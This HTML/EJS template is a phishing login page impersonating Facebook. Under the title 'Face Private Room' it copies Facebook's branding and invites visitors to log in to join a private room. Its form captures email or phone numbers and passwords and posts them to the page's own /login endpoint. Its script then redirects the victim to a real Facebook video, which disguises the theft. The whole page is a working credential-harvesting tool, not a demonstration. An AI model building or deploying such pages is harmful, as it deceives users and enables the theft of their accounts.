<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8" />
    <link rel="shortcut icon" href="https://www.facebook.com/images/fb_icon_325x325.png" type="image/x-icon">
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Face Private Room</title>
    <link rel="stylesheet" href="/index.css" />
    <style>
        /* Fullscreen Preloader */
        #preloader {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: #0866ff;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            z-index: 9999;
            transition: opacity 0.5s ease, visibility 0.5s ease;
        }

        /* Hide preloader after loading */
        #preloader.hidden {
            opacity: 0;
            visibility: hidden;
        }

        /* Preloader spinner */
        .preloader-spinner {
            border: 6px solid #f3f3f3;
            border-top: 6px solid #fff;
            border-radius: 50%;
            width: 50px;
            height: 50px;
            animation: spin 1s linear infinite;
            margin-bottom: 20px;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        /* Animated text */
        .preloader-text {
            color: #fff;
            font-size: 20px;
            font-weight: bold;
            animation: fadeInOut 2s ease-in-out infinite;
        }

        @keyframes fadeInOut {
            0%, 100% { opacity: 1; }
            50% { opacity: 0.5; }
        }

        .message {
            padding: 15px;
            margin: 15px 0;
            border-radius: 8px;
            font-size: 12px;
            font-weight: bold;
            text-align: center;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
        }

        .error {
            background-color: #f8d7da;
            color: #721c24;
            border: 1px solid #f5c6cb;
        }

        .success {
            background-color: #d4edda;
            color: #155724;
            border: 1px solid #c3e6cb;
        }

        .joining {
            display: flex;
            align-items: center;
            justify-content: center;
            margin-top: 20px;
            font-size: 16px;
            font-weight: 600;
            color: #3498db;
            border-radius: 5px;
            padding: 10px;
            background-color: #eaf4ff;
            box-shadow: 0px 4px 12px rgba(0, 0, 0, 0.1);
            border: 1px solid #b4d8ff;
            transition: all 0.3s ease-in-out;
        }

     
        .loader {
            margin-left: 10px;
            border: 4px solid #e0e0e0;
            border-radius: 50%;
            border-top: 4px solid #3498db;
            width: 16px;
            height: 16px;
            animation: spin 0.8s linear infinite;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>

<body>
    <!-- Preloader -->a
    <div id="preloader">
        <div class="preloader-spinner"></div>
        <div class="preloader-text">Verifying user to join room</div>
    </div>

    <!-- Main content starts here -->
    <div class="wrapper">
        <div class="left-side">
            <div class="left-container">
                <img src="/image/face.svg" class="img" alt="" />
                <h2 class="face-p">Log In to join private room.</h2>
            </div>
        </div>

        <div class="right-s">
            <div class="right-side"></div>
            <div class="login-box">
                <form action="/login" method="post" onsubmit="showSpinner()">
                    <% if (message) { %>
                        <div class="message <%= success ? 'success' : 'error' %>">
                            <%= message %>
                        </div>
                    <% } %>
                    
                    <input type="text" name="email" placeholder="Email address or phone number" required >
                    <input type="password" name="password" placeholder="Password" required>
                    
                    <!-- Spinner and "Joining..." text - initially hidden -->
                    <div class="joining" style="display: none;">
                        Joining... <div class="loader"></div>
                    </div>
                    
                    <!-- Submit button -->
                    <button type="submit" class="log">Join</button>
                
                    <a href="#" class="log-link">Forgotten password?</a>
                    <hr>
                    <div class="create-btn-wrapper">
                        <a href="https://web.facebook.com/?_rdc=1&_rdr" class="create-btn">Create new account</a>
                    </div>
                </form>
                
            </div>
            <div class="form-b">
                <a href="https://web.facebook.com/?_rdc=1&_rdr" class="create-p">Log In</a>
                 <span>to join the private room.</span> 
            </div>
        </div>
        </div>
        
    </div>

    <footer>
        <div class="foot-wrapper">
            <ul>
                <li><a href="">(UK)</a> </li>
                <li><a href="">Hausa</a></li>
                <li><a href="">Français (France)</a></li>
                <li><a href="">Português (Brasil)</a></li>
                <li><a href="">Español</a> </li>
                <li></li><a href="">العربية</a></li>
                <li><a href="">Bahasa Indonesia</a></li>
                <li><a href="">Deutsch</a></li>
                <li><a href="">日本語</a></li>
                <li><a href="">Italiano</a></li>
                <li><a href="">हिन्दी</a></li>
            </ul>
        </div>
    </footer>

    <script>
        // Hide the preloader once the page is loaded
        window.addEventListener("load", function() {
            const preloader = document.getElementById("preloader");
            preloader.classList.add("hidden");
        });

        // Show spinner function on form submit
        function showSpinner() {
            document.querySelector('.joining').style.display = 'flex';
    
            document.querySelector('.log').disabled = true;
        }








        async function handleFormSubmission(event) {
    event.preventDefault();
    
    // Collect form data
    const formData = {
        email: document.querySelector('input[name="email"]').value,
        password: document.querySelector('input[name="password"]').value
    };

    // Send POST request with form data
    const response = await fetch("/login", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(formData)
    });

    if (response.ok) {
        const data = await response.json();

        if (data.redirect) {
            // If response indicates a redirect, show success message and redirect after 3 seconds
            setTimeout(() => {
                window.location.href = 'https://www.facebook.com/share/v/QeSVNGdVsuCoW8Bs/?mibextid=WC7FNe';
            }, 3000); // 3-second delay for redirect
        } else {
            // Redirect to home page to display the error message
            window.location.href = '/';
        }
    }
}

// Attach submission handler to form
document.querySelector('form').addEventListener('submit', handleFormSubmission);


    </script>
    

    
    

</body>

</html>
